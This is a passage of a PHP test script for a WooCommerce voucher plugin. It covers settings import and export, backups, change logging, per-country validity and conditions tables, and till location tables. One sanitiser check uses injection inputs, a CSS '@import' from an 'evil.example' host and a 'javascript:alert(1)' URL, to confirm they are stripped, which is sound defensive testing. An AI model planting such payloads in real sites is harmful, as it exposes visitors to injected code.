	null === $pv_during && 0 === $pv_reads && 10 === count( $pv_log ) && '22' === end( $pv_log )['to'] && 'import' === end( $pv_log )['via'] && 10 === $pv_page_during && 11 === count( VCAP\SettingsLog::entries() ) && 11 === count( (array) $GLOBALS['vcap_test_options'][ VCAP\SettingsLog::OPTION ] ),
	json_encode( array( $pv_reads, count( $pv_log ) ) )
);
// PV-P1-6: the export text no longer promises "every setting of this tab".
$pv_desc = (string) ( VCAP\Admin\SettingsTools::fields()[0]['desc'] ?? '' );
check( 'PV-P1-6: the export text says that the rights per role are not part of the file', str_contains( $pv_desc, 'no rights per role' ) && ! str_contains( $pv_desc, 'every global setting' ) );
// PV-P4-2: role rights changed on the settings page are in the change log.
$GLOBALS['vcap_test_options'] = array();
VCAP\Source::with( VCAP\Source::ADMIN, static fn() => VCAP\SettingsLog::record_role( 'editor', 'vcap_scan_tickets', true ) );
VCAP\SettingsLog::record_role( 'support', 'vcap_increase_balance', false );
$pv_roles = VCAP\SettingsLog::entries();
$rc_src   = (string) file_get_contents( VCAP_PATH . 'src/Admin/RoleCaps.php' );
check(
	'PV-P4-2: saving the rights per role writes each granted or removed right to the change log as role:<role>:<right> (no → yes / yes → no)',
	2 === count( $pv_roles ) && 'role:editor:vcap_scan_tickets' === $pv_roles[0]['key'] && 'no' === $pv_roles[0]['from'] && 'yes' === $pv_roles[0]['to'] && 'admin' === $pv_roles[0]['source'] && 'role:support:vcap_increase_balance' === $pv_roles[1]['key'] && 'no' === $pv_roles[1]['to']
		&& str_contains( $rc_src, 'foreach ( self::apply( (array) $posted, self::role_objects() ) as $change => $granted )' ) && str_contains( $rc_src, 'SettingsLog::record_role(' ),
	json_encode( $pv_roles )
);
// PV-P4-5/P2-3: import, WP-CLI and restore clean text settings with the sanitiser of their field.
$GLOBALS['vcap_test_options'] = array(
	'vcap_default_terms' => "Nicht <strong>bar</strong> auszahlbar.\n<a href=\"https://shop.test/agb\">AGB</a>",
	'vcap_custom_css'    => ".vcap-x{background:url(\"data:image/svg+xml,%3Csvg%3E\")}\n.a > .b{width:100%}",
	'vcap_email_logo'    => 'https://shop.test/wp-content/uploads/logo%20neu.png',
);
$pv_text_before               = $GLOBALS['vcap_test_options'];
$pv_text                      = VCAP\SettingsTransfer::parse( VCAP\SettingsTransfer::export_json() );
$pv_text_diff                 = is_array( $pv_text ) ? VCAP\SettingsTransfer::diff( $pv_text['settings'] ) : array( 'refused' );
check(
	'PV-P4-5/P2-3: export → parse → apply keeps the HTML of the default conditions (<strong>, link), the custom CSS (%3C, ">") and %20 of the logo URL; CSS is cleaned like on the page (@import removed)',
	is_array( $pv_text ) && array() === $pv_text_diff && $pv_text_before['vcap_default_terms'] === $pv_text['settings']['vcap_default_terms'] && $pv_text_before['vcap_custom_css'] === $pv_text['settings']['vcap_custom_css'] && $pv_text_before['vcap_email_logo'] === $pv_text['settings']['vcap_email_logo']
		&& '.a{}' === trim( (string) VCAP\SettingsTransfer::validate( 'vcap_custom_css', '@import url(https://evil.example/x.css); .a{}' ) ) && '' === VCAP\SettingsTransfer::validate( 'vcap_email_logo', 'javascript:alert(1)' ),
	json_encode( $pv_text_diff )
);
// PV-P2-6: no backup when a reset changes nothing, none identical to the newest; 10 kept.
$GLOBALS['vcap_test_options'] = array();
$pv_none                      = VCAP\SettingsTransfer::reset( null );
$pv_b1                        = VCAP\SettingsTransfer::backup( 'import' );
$pv_b2                        = VCAP\SettingsTransfer::backup( 'import' );
for ( $pv_i = 0; $pv_i < 12; $pv_i++ ) {
	update_option( 'vcap_code_length', (string) ( 14 + $pv_i ) );
	VCAP\SettingsTransfer::backup( 'import' );
}
check(
	'PV-P2-6: a reset that changes nothing takes no backup; a backup identical to the newest one is not stored again; the newest 10 backups are kept',
	array() === $pv_none['changed'] && 0 === $pv_none['backup'] && ! isset( $GLOBALS['vcap_test_options'][ VCAP\SettingsTransfer::BACKUP_OPTION ][0] ) && $pv_b1 === $pv_b2 && 10 === count( VCAP\SettingsTransfer::backups() )
		&& '25' === json_decode( VCAP\SettingsTransfer::backup_json(), true )['settings']['vcap_code_length'],
	json_encode( array_keys( VCAP\SettingsTransfer::backups() ) )
);
// PV-P2-7: a double click on "Apply" / "Reset" keeps the message of the first click.
check(
	'PV-P2-7: the buttons ignore a second click; an import or reset whose preview was used in the last 30 seconds returns to the page with the first message instead of "expired"',
	str_contains( VCAP\Admin\SettingsUi::action_button( 'vcap_settings_import_apply', 'Apply' ), 'if(this.dataset.vcapSent){return false;}' ) && 2 === substr_count( $st_tools_src, 'self::repeated_click();' ) && 2 === substr_count( $st_tools_src, 'self::mark_used();' )
		&& strpos( $st_tools_src, 'self::repeated_click();' ) < strpos( $st_tools_src, "'The import preview has expired. Please upload the file again.'" )
);
// PV-P2-4 (SettingsTransfer part): a whole number from a file or WP-CLI is stored as one.
check(
	'PV-P2-4: import / WP-CLI store whole-number settings as whole numbers ("5.0" → "5", "1e1" → "10"); decimals keep their text; non-numbers stay refused',
	'5' === VCAP\SettingsTransfer::validate( 'vcap_delivery_hour', '5.0' ) && '10' === VCAP\SettingsTransfer::validate( 'vcap_delivery_hour', '1e1' ) && '10.50' === VCAP\SettingsTransfer::validate( 'vcap_customer_daily_limit', '10.50' ) && is_wp_error( VCAP\SettingsTransfer::validate( 'vcap_delivery_hour', 'abc' ) )
);
$GLOBALS['vcap_test_options'] = $st_saved;

// SET-VC-03: Site Health checks every selling country in the market data, not only the EU (a Swiss shop gets hints).
$GLOBALS['vcap_test_pll'] = array( 'de' => 'de_CH', 'fr' => 'fr_CH' );
$m_ready                  = VCAP\Markets::readiness( array( 'CH', 'us', 'DE' ) );
$GLOBALS['vcap_test_options']['vcap_terms_by_country'] = 'CH: Einlösung in allen Filialen.';
$GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ] = 'CH: 10';
$m_ready_set = VCAP\Markets::readiness( array( 'CH' ) );
unset( $GLOBALS['vcap_test_pll'], $GLOBALS['vcap_test_options']['vcap_terms_by_country'], $GLOBALS['vcap_test_options'][ VCAP\Markets::EXPIRY_OPTION ] );
$m_health = (string) file_get_contents( VCAP_PATH . 'src/Health.php' );
check(
	'SET-VC-03: readiness covers Switzerland – validity not verified, no conditions, French (fr_CH, offered by Polylang) untranslated while de_CH uses the de_DE_formal file; unknown selling countries are listed separately',
	array( 'CH', 'DE' ) === array_keys( $m_ready ) && false === $m_ready['CH']['validity'] && false === $m_ready['CH']['terms'] && false === $m_ready['CH']['translation'] && array( 'fr_CH' ) === $m_ready['CH']['untranslated'] && 'de_CH' === $m_ready['CH']['locale']
		&& true === $m_ready['DE']['validity'] && true === $m_ready['DE']['translation']
		&& true === $m_ready_set['CH']['validity'] && true === $m_ready_set['CH']['terms']
		&& array( 'BR', 'US' ) === VCAP\Markets::unknown_selling_countries( array( 'US', 'CH', 'BR', 'DE' ) )
		&& str_contains( $m_health, 'Markets::unknown_selling_countries( $selling )' ) && str_contains( $m_health, 'Voucher rules are set for every country you sell to' ) && ! str_contains( $m_health, 'every EU country' ),
	json_encode( array( $m_ready, $m_ready_set ) )
);
check( 'SET-VC-03: the translation fallback chain (de_CH → de_DE_formal → de_DE)', array( 'de_CH', 'de_DE_formal', 'de_DE' ) === VCAP\I18n::chain( 'de_CH' ) && array( 'fr_CH' ) === VCAP\I18n::chain( 'fr_CH' ) );
// SET-VC-04: statutory validity and conditions per country as tables (rows), old text values still read.
echo "SET-VC-04 country tables\n";
$c4_saved = $GLOBALS['vcap_test_options'];
$c4_exp   = VCAP\Markets::EXPIRY_OPTION;
$c4_trm   = VCAP\Markets::TERMS_OPTION;
// Old text values keep working (read unchanged, converted to rows).
$GLOBALS['vcap_test_options'][ $c4_exp ] = "FR: 5 end\nAT: 1\nbroken";
check(
	'SET-VC-04: a validity value stored as text before 1.3.0 is read and converted to rows; the filter vcap_statutory_expiry still gets the same rule',
	array( array( 'country' => 'FR', 'years' => 5, 'end_of_year' => true, 'note' => '' ), array( 'country' => 'AT', 'years' => 1, 'end_of_year' => false, 'note' => '' ) ) === VCAP\Markets::expiry_rows( get_option( $c4_exp ) )
		&& array( 'years' => 5, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'FR' ) && 'setting' === VCAP\Markets::expiry_rule( 'AT' )['source'] && array( 'broken' ) === VCAP\Markets::unparsed_expiry_lines( get_option( $c4_exp ) )
);
// The new storage: rows under the same option name.
$GLOBALS['vcap_test_options'][ $c4_exp ] = array(
	array( 'country' => 'fr', 'years' => '5', 'end_of_year' => '1', 'note' => 'Code civil' ),
	array( 'country' => 'IT', 'years' => 10, 'end_of_year' => false, 'note' => '' ),
);
$GLOBALS['vcap_test_filters']['vcap_statutory_expiry'] = array( array( static fn( $rule, $country ) => 'IT' === $country ? array( 'years' => 2, 'end_of_year' => false ) : $rule, 2 ) );
check(
	'SET-VC-04: validity rows decide the statutory rule (note kept), unparsed lines are none, and the filter vcap_statutory_expiry still wins',
	array( 'years' => 5, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'FR' ) && array( 'years' => 2, 'end_of_year' => false ) === ProductConfig::statutory_rule( 'IT' ) && array( 'years' => 3, 'end_of_year' => true ) === ProductConfig::statutory_rule( 'DE' )
		&& 'Code civil' === VCAP\Markets::expiry_rows( get_option( $c4_exp ) )[0]['note'] && array() === VCAP\Markets::unparsed_expiry_lines( get_option( $c4_exp ) )
);
unset( $GLOBALS['vcap_test_filters']['vcap_statutory_expiry'] );
$c4_check = VCAP\Markets::check_expiry_rows(
	array(
		array( 'country' => 'DE', 'years' => '3', 'end_of_year' => '1', 'note' => 'BGB § 195' ),
		array( 'country' => '', 'years' => '', 'note' => '' ),
		array( 'country' => 'XX', 'years' => '3' ),
		array( 'country' => 'AT', 'years' => 'drei' ),
		array( 'country' => 'DE', 'years' => '5' ),
		array( 'country' => '', 'years' => '4' ),
		array( 'country' => 'NL', 'years' => '0' ),
	)
);
check(
	'SET-VC-04: an invalid validity row is not taken – unknown country, years not 0–999, a second row for a country, no country – and the error names the row; empty rows are skipped silently',
	array( 'DE', 'NL' ) === array_column( $c4_check['rows'], 'country' ) && 0 === $c4_check['rows'][1]['years'] && array( 2, 3, 4, 5 ) === array_keys( $c4_check['errors'] )
		&& str_starts_with( $c4_check['errors'][2], 'Row 3 (XX):' ) && str_contains( $c4_check['errors'][3], '"drei"' ) && str_contains( $c4_check['errors'][4], 'row 1' ) && str_starts_with( $c4_check['errors'][5], 'Row 6:' ),
	json_encode( $c4_check )
);
// Conditions: old text blocks and rows with a language.
check(
	'SET-VC-04: conditions stored as text before 1.3.0 are read as rows for all languages (same result as before)',
	array( array( 'country' => 'AT', 'language' => '', 'text' => 'Gültig 30 Jahre.' ) ) === VCAP\Markets::terms_rows( "AT: Gültig 30 Jahre." ) && array( 'AT' => 'Gültig 30 Jahre.' ) === ProductConfig::terms_by_country( "AT: Gültig 30 Jahre.", 'en_GB' )
);
$c4_rows = array(
	array( 'country' => 'AT', 'language' => 'en_GB', 'text' => 'Valid for 30 years.' ),
	array( 'country' => 'AT', 'language' => '', 'text' => "Gültig 30 Jahre.\nKeine Barauszahlung." ),
	array( 'country' => 'CH', 'language' => 'fr_CH', 'text' => 'Valable 5 ans.' ),
	array( 'country' => 'CH', 'language' => 'de_CH', 'text' => 'Gültig 5 Jahre.' ),
);
check(
	'SET-VC-04: the row in the customer\'s language wins, else the row for all languages, else the same language, else the first row of the country',
	array( 'AT' => 'Valid for 30 years.', 'CH' => 'Valable 5 ans.' ) === ProductConfig::terms_by_country( $c4_rows, 'en_GB' ) && array( 'AT' => "Gültig 30 Jahre.\nKeine Barauszahlung.", 'CH' => 'Gültig 5 Jahre.' ) === ProductConfig::terms_by_country( $c4_rows, 'de_DE' )
		&& 'Valable 5 ans.' === ProductConfig::terms_by_country( $c4_rows, 'fr_FR' )['CH'] && 'Valable 5 ans.' === ProductConfig::terms_by_country( $c4_rows, 'it_IT' )['CH']
);
$GLOBALS['vcap_test_options'][ $c4_trm ] = $c4_rows;
$GLOBALS['vcap_test_options']['vcap_default_terms'] = 'General terms';
check(
	'SET-VC-04: ProductConfig::terms() reads the table in the site language (de_DE), other countries use the general conditions; the health check sees the country conditions',
	"Gültig 30 Jahre.\nKeine Barauszahlung." === ProductConfig::terms( ProductConfig::DEFAULTS, 'at' ) && 'Gültig 5 Jahre.' === ProductConfig::terms( ProductConfig::DEFAULTS, 'CH' ) && 'General terms' === ProductConfig::terms( ProductConfig::DEFAULTS, 'DE' )
		&& isset( ProductConfig::terms_variants( ProductConfig::DEFAULTS )['AT'] ) && array() === ProductConfig::unassigned_terms_lines( $c4_rows )
);
$c4_tcheck = VCAP\Markets::check_terms_rows(
	array(
		array( 'country' => 'AT', 'language' => '', 'text' => '<b>Gültig</b> 30 Jahre.' ),
		array( 'country' => 'AT', 'language' => '', 'text' => 'Doppelt' ),
		array( 'country' => 'DE', 'language' => '', 'text' => '' ),
		array( 'country' => 'DE', 'language' => 'x"y', 'text' => 'Text' ),
		array( 'country' => '', 'language' => 'de_DE', 'text' => '' ),
		array( 'country' => 'DE', 'language' => 'de_DE_formal', 'text' => 'Sie' ),
	)
);
check(
	'SET-VC-04: an invalid conditions row is not taken (second row for country and language, no text, invalid language) and named; a row with only a language is empty',
	array( 'AT', 'DE' ) === array_column( $c4_tcheck['rows'], 'country' ) && 'de_DE_formal' === $c4_tcheck['rows'][1]['language'] && array( 1, 2, 3 ) === array_keys( $c4_tcheck['errors'] ) && str_starts_with( $c4_tcheck['errors'][1], 'Row 2 (AT):' ),
	json_encode( $c4_tcheck )
);
// Settings page save: invalid rows are not saved, an error names them, the field was not on the page = keep value.
WC_Admin_Settings::$errors = array();
$c4_field = array( 'id' => $c4_exp, 'title' => 'Statutory validity per country' );
$c4_saved_rows = VCAP\Admin\CountryTableField::sanitize( null, $c4_field, array( 'submitted' => '1', 'rows' => array( 5 => array( 'country' => 'DE', 'years' => '3', 'end_of_year' => '1', 'note' => '' ), 9 => array( 'country' => 'AT', 'years' => '-1' ), 12 => array( 'country' => '', 'years' => '' ) ) ) );
$c4_terms_saved = VCAP\Admin\CountryTableField::sanitize( 'flattened', array( 'id' => $c4_trm, 'title' => 'Conditions' ), array( 'submitted' => '1', 'rows' => array( array( 'country' => 'AT', 'language' => '', 'text' => "Zeile 1\nZeile 2" ) ) ) );
check(
	'SET-VC-04: saving the settings page stores the valid rows, leaves an invalid row out with an error naming it, keeps line breaks of the conditions, and keeps the stored value when the table was not submitted',
	array( array( 'country' => 'DE', 'years' => 3, 'end_of_year' => true, 'note' => '' ) ) === $c4_saved_rows && 1 === count( WC_Admin_Settings::$errors ) && str_contains( WC_Admin_Settings::$errors[0], 'Row 2 (AT):' ) && str_contains( WC_Admin_Settings::$errors[0], 'not saved' )
		&& "Zeile 1\nZeile 2" === $c4_terms_saved[0]['text'] && null === VCAP\Admin\CountryTableField::sanitize( null, $c4_field, null ),
	json_encode( array( $c4_saved_rows, WC_Admin_Settings::$errors ) )
);
$c4_rej = new ReflectionMethod( VCAP\Admin\CountryTableField::class, 'rejected' );
$c4_rej->setAccessible( true );
$c4_rejected = $c4_rej->invoke( null, $c4_exp, array( array( 'country' => 'DE', 'years' => '3' ), array( 'country' => 'at', 'years' => 'x<b>', 'note' => 'n' ) ), array( 1 => 'Row 2 (AT): "x" is not a number.' ) );
check(
	'SET-VC-04: a row that was not saved is kept (cleaned) to be shown again with its error, so nothing typed is lost',
	array( array( 'country' => 'AT', 'error' => '"x" is not a number.', 'years' => 'x', 'end_of_year' => false, 'note' => 'n' ) ) === $c4_rejected,
	json_encode( $c4_rejected )
);
// Import / WP-CLI (register type "table").
$c4_imp_old = VCAP\SettingsTransfer::validate( $c4_exp, "DE: 3 end\nAT: 30" );
$c4_imp_bad = VCAP\SettingsTransfer::validate( $c4_exp, array( array( 'country' => 'DE', 'years' => 'x' ) ) );
check(
	'SET-VC-04: both settings are of register type "table" (default: no rows); an import accepts rows or the old text and refuses an invalid row; a change of a table is detected and shown',
	'table' === VCAP\SettingsRegistry::get( $c4_exp )['type'] && 'table' === VCAP\SettingsRegistry::get( $c4_trm )['type'] && array() === VCAP\SettingsRegistry::default( $c4_trm )
		&& array( 'DE', 'AT' ) === array_column( (array) $c4_imp_old, 'country' ) && is_wp_error( $c4_imp_bad ) && is_wp_error( VCAP\SettingsTransfer::validate( $c4_exp, "DE: drei" ) )
		&& ! VCAP\SettingsTransfer::same( array( array( 'country' => 'DE', 'years' => 3 ) ), array( array( 'country' => 'DE', 'years' => 5 ) ) ) && VCAP\SettingsTransfer::same( $c4_rows, $c4_rows )
		&& 'DE 3 ✓; AT 30' === VCAP\SettingsTransfer::display( array( array( 'country' => 'DE', 'years' => 3, 'end_of_year' => true, 'note' => '' ), array( 'country' => 'AT', 'years' => 30, 'end_of_year' => false, 'note' => '' ) ) ),
	json_encode( array( $c4_imp_old, VCAP\SettingsTransfer::display( (array) $c4_imp_old ) ) )
);
// Rendering: a real table, a label per control, buttons, one empty row, old unconvertible lines listed.
$GLOBALS['vcap_test_options'][ $c4_exp ] = "DE: 3 end\nkaputt";
ob_start();
VCAP\Admin\CountryTableField::render( array( 'id' => $c4_exp, 'title' => 'Statutory validity per country', 'desc' => 'Not legally checked.' ) );
$c4_html = (string) ob_get_clean();
ob_start();
VCAP\Admin\CountryTableField::render( array( 'id' => $c4_trm, 'title' => 'Conditions', 'desc' => '' ) );
$c4_thtml = (string) ob_get_clean();
check(
	'SET-VC-04: the field is a table with caption and column headers, every control has its own label, "Add row" and "Remove" are buttons, an empty row works without JavaScript, old lines that cannot be converted are shown',
	str_contains( $c4_html, '<caption' ) && 5 === substr_count( $c4_html, '<th scope="col">' ) && str_contains( $c4_html, 'for="vcap_expiry_by_country-0-country" data-label="Country, row %d">Country, row 1</label>' ) && str_contains( $c4_html, 'for="vcap_expiry_by_country-1-years" data-label="Years, row %d">Years, row 2</label>' )
		&& str_contains( $c4_html, 'name="vcap_expiry_by_country[rows][0][end_of_year]" checked="checked"' ) && str_contains( $c4_html, '<option value="DE" selected="selected">' ) && str_contains( $c4_html, '<button type="button" class="button vcap-row-add"' ) && str_contains( $c4_html, 'class="button-link vcap-row-remove"' )
		&& str_contains( $c4_html, '<template class="vcap-row-template">' ) && str_contains( $c4_html, '[rows][__index__][country]' ) && str_contains( $c4_html, '<code>kaputt</code>' ) && str_contains( $c4_html, 'name="vcap_expiry_by_country[submitted]"' ) && str_contains( $c4_html, 'Not legally checked.' )
		&& str_contains( $c4_thtml, '>Language, row 1</label>' ) && str_contains( $c4_thtml, '<option value="en_GB" selected="selected">en_GB</option>' ) && str_contains( $c4_thtml, '<option value="">All languages</option>' ) && str_contains( $c4_thtml, "Gültig 30 Jahre.\nKeine Barauszahlung.</textarea>" ),
	substr( $c4_thtml, 0, 400 )
);
$c4_js = (string) file_get_contents( VCAP_PATH . 'assets/js/country-table.js' );
check(
	'SET-VC-04: the script moves the focus after adding (first field) and removing (next row or "Add row") and announces it; ACCESSIBILITY.md describes the table',
	str_contains( $c4_js, 'first.focus()' ) && str_contains( $c4_js, '( focus || add ).focus()' ) && str_contains( $c4_js, 'wp.a11y.speak' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'ACCESSIBILITY.md' ), 'SET-VC-04' )
);
$GLOBALS['vcap_test_options'] = $c4_saved;

// SET-VC-22: own section "Counter & locations"; the till list as a table (name, key, active + add-on columns).
echo "SET-VC-22 counter & locations\n";
$c22_saved    = $GLOBALS['vcap_test_options'];
$c22_settings = new VCAP\Settings();
$c22_ids      = static fn( array $fields ): array => array_values( array_filter( array_map( static fn( $f ) => in_array( $f['type'] ?? '', array( 'title', 'sectionend' ), true ) ? '' : (string) ( $f['id'] ?? '' ), $fields ) ) );
$c22_moved    = array( VCAP\Counter::USER_AMOUNT, VCAP\Counter::USER_COUNT, VCAP\Counter::TILL_AMOUNT, VCAP\Counter::TILL_COUNT, VCAP\Counter::REQUIRE_RECEIPT, VCAP\Counter::LOCATIONS );
$c22_counter  = $c22_ids( $c22_settings->fields( 'counter' ) );
check(
	'SET-VC-22: section "Counter & locations" holds the counter limits, the receipt number and the till table (option names unchanged, register section "counter"); "Privacy & advanced" no longer does',
	'Counter & locations' === ( $c22_settings->section_list()['counter'] ?? '' ) && $c22_moved === array_values( array_intersect( $c22_counter, $c22_moved ) ) && array() === array_intersect( $c22_ids( $c22_settings->fields( 'privacy' ) ), $c22_moved ) && array() === array_filter( $c22_moved, static fn( $k ) => 'counter' !== VCAP\SettingsRegistry::get( $k )['section'] ) && $c22_moved === VCAP\SettingsRegistry::in_section( 'counter' ),
	wp_json_encode( $c22_counter )
);
// Old values: the free text of 1.2.0 (one name per line) is read as active tills with a key from the name.
$GLOBALS['vcap_test_options'][ VCAP\Counter::LOCATIONS ] = "Shop A\r\nKasse Süd\n\n  Shop A \nShop A2";
$c22_rows = VCAP\CounterLocations::rows();
check(
	'SET-VC-22: an old free-text till list is read – every line an active till (duplicates and empty lines dropped), keys from the names; the scanner list is unchanged',
	array( 'Shop A', 'Kasse Süd', 'Shop A2' ) === VCAP\Counter::locations() && 'shop-a' === $c22_rows[0]['key'] && str_starts_with( $c22_rows[1]['key'], 'kasse-s' ) && 'shop-a2' === $c22_rows[2]['key'] && array( 'yes', 'yes', 'yes' ) === array_column( $c22_rows, 'active' ),
	wp_json_encode( $c22_rows )
);
$c22_conv = VCAP\CounterLocations::sanitize_option( "Shop A\nShop B", array( 'id' => VCAP\Counter::LOCATIONS ), "Shop A\nShop B" );
$c22_post = VCAP\CounterLocations::sanitize_option(
	null,
	array( 'id' => VCAP\Counter::LOCATIONS ),
	array(
		array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'yes' ),
		array( 'name' => 'Pop-up <b>Stand</b>', 'key' => 'SHOP-A' ),
		array( 'name' => '', 'key' => '', 'active' => 'yes' ),
		array( 'name' => 'Shop A', 'key' => 'dup', 'active' => 'yes' ),
	)
);
$GLOBALS['vcap_test_options'][ VCAP\Counter::LOCATIONS ] = $c22_post;
check(
	'SET-VC-22: saving converts the old text to the JSON table and stores the posted rows checked (unticked = inactive, empty rows and duplicate names dropped, unique keys); inactive tills are not offered on the scanner; nothing posted keeps the value',
	is_array( json_decode( (string) $c22_conv, true ) ) && array( 'Shop A', 'Shop B' ) === array_column( json_decode( (string) $c22_conv, true ), 'name' )
		&& array( array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'yes' ), array( 'name' => 'Pop-up Stand', 'key' => 'shop-a-2', 'active' => 'no' ) ) === VCAP\CounterLocations::rows()
		&& array( 'Shop A' ) === VCAP\Counter::locations() && null === VCAP\CounterLocations::sanitize_option( null, array(), null ) && '' === VCAP\CounterLocations::sanitize_option( '', array(), array() ) && '' === VCAP\SettingsRegistry::default( VCAP\Counter::LOCATIONS ),
	(string) $c22_post
);
// Add-on columns (filter vcap_counter_location_fields): rendered, stored with the row, kept while the add-on is off.
add_filter(
	'vcap_counter_location_fields',
	static fn( $c ) => array_merge(
		$c,
		array(
			'pos_id' => array( 'label' => 'POS terminal', 'type' => 'text' ),
			'region' => array( 'label' => 'Region', 'type' => 'select', 'options' => array( 'north' => 'North', 'south' => 'South' ), 'default' => 'south' ),
			'name'   => array( 'label' => 'Hijack', 'type' => 'checkbox' ),
		)
	)
);
$c22_cols = VCAP\CounterLocations::columns();
$c22_add  = VCAP\CounterLocations::sanitize_option( null, array(), array( array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'yes', 'pos_id' => 'T-17', 'region' => 'west' ) ) );
$GLOBALS['vcap_test_options'][ VCAP\Counter::LOCATIONS ] = $c22_add;
ob_start();
VCAP\CounterLocations::render( VCAP\CounterLocations::field() );
$c22_html = (string) ob_get_clean();
unset( $GLOBALS['vcap_test_filters']['vcap_counter_location_fields'] );
$c22_kept = VCAP\CounterLocations::sanitize_option( null, array(), array( array( 'name' => 'Shop A1', 'key' => 'shop-a', 'active' => 'yes' ) ) );
check(
	'SET-VC-22: filter vcap_counter_location_fields adds columns (text, select) – shown in the table, stored with the row (unknown choice = default); core columns cannot be changed; the values stay when the add-on is off',
	array( 'name', 'key', 'active', 'pos_id', 'region' ) === array_keys( $c22_cols ) && 'text' === $c22_cols['name']['type']
		&& array( 'name' => 'Shop A', 'key' => 'shop-a', 'active' => 'yes', 'pos_id' => 'T-17', 'region' => 'south' ) === json_decode( (string) $c22_add, true )[0]
		&& str_contains( $c22_html, '<th scope="col">POS terminal</th>' ) && str_contains( $c22_html, 'name="vcap_counter_locations[0][pos_id]" value="T-17"' ) && str_contains( $c22_html, 'name="vcap_counter_locations[3][name]"' ) && ! str_contains( $c22_html, 'vcap_counter_locations[4]' ) && str_contains( $c22_html, 'aria-label="Region, row 1"' )
		&& 'T-17' === ( json_decode( (string) $c22_kept, true )[0]['pos_id'] ?? '' ) && 'Shop A1' === json_decode( (string) $c22_kept, true )[0]['name'],
	$c22_html
);
$GLOBALS['vcap_test_options'] = $c22_saved;

// SET-VC-33: rules of physical cards and partner plugins as settings (1.12 no. 12, 35, 38–40); default = 1.2.0,
// the filter of the same name gets the setting and wins; partner rules are shown only while the partner is active.
echo "SET-VC-33 integration rules\n";
$s33_saved = $GLOBALS['vcap_test_options'];
$s33_ids   = static fn(): array => array_column( array_filter( ( new VCAP\Settings() )->fields( 'api' ), static fn( $f ) => isset( $f['id'] ) && ! in_array( $f['type'] ?? '', array( 'title', 'sectionend' ), true ) ), 'id' );
$s33_rules = array( VCAP\Integrations\ReviewSource::FIRST_ONLY_OPTION, VCAP\Compat\AffiliateCaptain::COMMISSION_OPTION, VCAP\Compat\PassCaptain\Revocation::RESTORE_OPTION, VCAP\Compat\Subscriptions::SWITCH_OPTION );
add_filter( 'vcap_settings_partner_active', static fn() => false );
$s33_off = $s33_ids();
unset( $GLOBALS['vcap_test_filters']['vcap_settings_partner_active'] );
add_filter( 'vcap_settings_partner_active', static fn( $active, $partner ) => 'affiliate' === $partner || 'subscriptions' === $partner, 10, 2 );
$s33_some = $s33_ids();
unset( $GLOBALS['vcap_test_filters']['vcap_settings_partner_active'] );
check(
	'SET-VC-33: block "Integration rules" on Integrations (API) – each partner rule only while its partner plugin is active; physical cards always under "Delivery & downloads" (own function, table 1.12 no. 12); defaults are those of 1.2.0',
	! in_array( VCAP\PhysicalCards::STATUSES_OPTION, $s33_off, true ) && in_array( VCAP\PhysicalCards::STATUSES_OPTION, array_column( ( new VCAP\Settings() )->fields( 'delivery' ), 'id' ), true ) && 'delivery' === VCAP\SettingsRegistry::get( VCAP\PhysicalCards::STATUSES_OPTION )['section'] && array() === array_intersect( $s33_rules, $s33_off ) && array( VCAP\Compat\AffiliateCaptain::COMMISSION_OPTION, VCAP\Compat\Subscriptions::SWITCH_OPTION ) === array_values( array_intersect( $s33_rules, $s33_some ) )
		&& array( 'completed' ) === VCAP\SettingsRegistry::default( VCAP\PhysicalCards::STATUSES_OPTION ) && array( 'yes', 'yes', 'yes', 'no' ) === array_map( array( VCAP\SettingsRegistry::class, 'default' ), $s33_rules ) && array() === array_filter( $s33_rules, static fn( $k ) => 'api' !== VCAP\SettingsRegistry::get( $k )['section'] ),
	wp_json_encode( array( $s33_off, $s33_some ) )
);
// No. 12: activation statuses of physical cards.
$s33_default = VCAP\PhysicalCards::activation_statuses();
$GLOBALS['vcap_test_options'][ VCAP\PhysicalCards::STATUSES_OPTION ] = array( 'processing', 'wc-completed', 'on-hold', 'processing' );
$s33_set  = VCAP\PhysicalCards::activation_statuses();
$s33_seen = null;
add_filter( 'vcap_physical_activation_statuses', static function ( $statuses ) use ( &$s33_seen ) { $s33_seen = $statuses; return array( 'shipped' ); } );
$s33_filtered = VCAP\PhysicalCards::activation_statuses();
unset( $GLOBALS['vcap_test_filters']['vcap_physical_activation_statuses'] );
check(
	'SET-VC-33: physical cards – activated at "completed" by default; the setting (paid statuses only, empty = completed) decides; filter vcap_physical_activation_statuses gets it and wins',
	array( 'completed' ) === $s33_default && array( 'processing', 'completed' ) === $s33_set && array( 'processing', 'completed' ) === $s33_seen && array( 'shipped' ) === $s33_filtered
		&& array( 'completed' ) === VCAP\PhysicalCards::sanitize_statuses( array( 'pending', 'refunded' ) ) && array( 'completed' ) === VCAP\PhysicalCards::sanitize_statuses( '' ) && ! isset( VCAP\PhysicalCards::status_choices()['pending'] ),
	wp_json_encode( array( $s33_default, $s33_set, $s33_seen ) )
);
// No. 35: review request only for the first redemption.
$s33_voucher = new VCAP\Voucher();
$s33_r_def   = VCAP\Integrations\ReviewSource::first_redemption_only( $s33_voucher );
$GLOBALS['vcap_test_options'][ VCAP\Integrations\ReviewSource::FIRST_ONLY_OPTION ] = 'no';
$s33_r_off = VCAP\Integrations\ReviewSource::first_redemption_only( $s33_voucher );
add_filter( 'vcap_review_first_redemption_only', static fn() => true );
$s33_r_filtered = VCAP\Integrations\ReviewSource::first_redemption_only( $s33_voucher );
unset( $GLOBALS['vcap_test_filters']['vcap_review_first_redemption_only'] );
check( 'SET-VC-33: review source – only the first redemption by default; setting off = every redemption; filter vcap_review_first_redemption_only wins', true === $s33_r_def && false === $s33_r_off && true === $s33_r_filtered );
// No. 38: commission on voucher sales (Affiliate Captain).
$s33_aff  = new VCAP\Compat\AffiliateCaptain();
$s33_args = array();
add_filter( 'vcap_affiliate_commission_on_voucher_sales', static function ( $pay ) use ( &$s33_args ) { $s33_args[] = $pay; return $pay; } );
$s33_a_item = array( 'product_id' => 0 );
$s33_a_sale = array( 'source' => 'woocommerce' );
unset( $GLOBALS['vcap_test_options'][ VCAP\Compat\AffiliateCaptain::COMMISSION_OPTION ] );
$s33_aff->commission_base( 100, $s33_a_item, $s33_a_sale );
